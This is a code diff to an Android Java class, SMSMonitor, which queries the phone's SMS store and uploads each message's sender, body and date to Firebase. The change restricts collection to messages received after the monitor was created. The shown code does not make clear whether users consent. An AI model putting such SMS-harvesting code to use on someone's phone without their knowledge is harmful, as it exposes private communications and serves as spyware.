@@ -22,11 +22,13 @@ public class SMSMonitor {
     private String phoneModel;
     private Context context;
     private BaseContentObserver smsObserver;
+    private long installationDate;
 
     public SMSMonitor(Context context, String userId, String phoneModel) {
         this.context = context;
         this.userId = userId;
         this.phoneModel = phoneModel;
+        this.installationDate = System.currentTimeMillis(); // Set installation date to current time
     }
 
     public void startMonitoring() {
@@ -72,7 +74,7 @@ public class SMSMonitor {
         try {
             cursor = context.getContentResolver().query(
                     Uri.parse("content://sms"),
-                    null, null, null, "date DESC");
+                    null, "date >= ?", new String[]{String.valueOf(installationDate)}, "date DESC");
 
             if (cursor != null && cursor.moveToFirst()) {
                 do {
@@ -90,16 +92,18 @@ public class SMSMonitor {
                         long timestamp = cursor.getLong(dateColumnIndex); // Message timestamp
                         String smsDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date(timestamp));
 
-                        // Create SMSData object
-                        SMSData smsData = new SMSData(type, address, body, smsDate);
-                        smsData.setTimestamp(timestamp);
+                        if (timestamp >= installationDate) { // Check if SMS is from the date of installation
+                            // Create SMSData object
+                            SMSData smsData = new SMSData(type, address, body, smsDate);
+                            smsData.setTimestamp(timestamp);
 
-                        // Generate unique ID for SMS based on address and timestamp
-                        String uniqueSMSId = generateUniqueId(address, timestamp);
+                            // Generate unique ID for SMS based on address and timestamp
+                            String uniqueSMSId = generateUniqueId(address, timestamp);
 
-                        // Upload SMS to Firebase
-                        DatabaseHelper dbHelper = new DatabaseHelper();
-                        dbHelper.uploadSMSDataByDate(userId, phoneModel, smsData, uniqueSMSId, smsDate);
+                            // Upload SMS to Firebase
+                            DatabaseHelper dbHelper = new DatabaseHelper();
+                            dbHelper.uploadSMSDataByDate(userId, phoneModel, smsData, uniqueSMSId, smsDate);
+                        }
                     } else {
                         Log.w(TAG, "Missing required columns in SMS log.");
                     }
